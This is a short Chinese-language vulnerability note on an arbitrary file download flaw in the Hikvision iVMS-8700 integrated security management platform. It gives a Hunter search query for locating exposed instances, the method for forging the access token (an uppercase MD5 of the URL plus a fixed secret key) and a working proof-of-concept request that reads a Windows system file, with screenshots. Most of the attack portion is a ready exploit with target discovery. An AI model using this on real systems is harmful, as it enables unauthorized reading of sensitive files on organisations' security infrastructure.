# 海康威视 iVMS-8700综合安防管理平台 download 任意文件下载

# 一、漏洞简介
HIKVISION iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息

# 二、影响版本
+ HIKVISION iVMS-8700综合安防管理平台

# 三、资产测绘
+ hunter：`app.name=="Hikvision 海康威视 iVMS"`

![1691846011747-3e390938-652e-4fe6-b38a-508a0b3213c5.png](./img/rCOOTOGt_2fSkyU3/1691846011747-3e390938-652e-4fe6-b38a-508a0b3213c5-829726.png)

+ 登录页面

![1691846029356-5d70967f-a564-438d-9b21-de08e829d5aa.png](./img/rCOOTOGt_2fSkyU3/1691846029356-5d70967f-a564-438d-9b21-de08e829d5aa-705897.png)

# 四、漏洞复现
poc，token为`url+secretKeyIbuilding`进行MD5加密（**32位大写**）

```plain
/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 
```

![1691846212487-b9d3a53e-febe-4ceb-9974-87fbbf347f48.png](./img/rCOOTOGt_2fSkyU3/1691846212487-b9d3a53e-febe-4ceb-9974-87fbbf347f48-196042.png)

![1691846233174-cb5861b5-fd91-4610-9d18-dc62ca069f13.png](./img/rCOOTOGt_2fSkyU3/1691846233174-cb5861b5-fd91-4610-9d18-dc62ca069f13-057686.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/okdesxq0iuq0sfkb>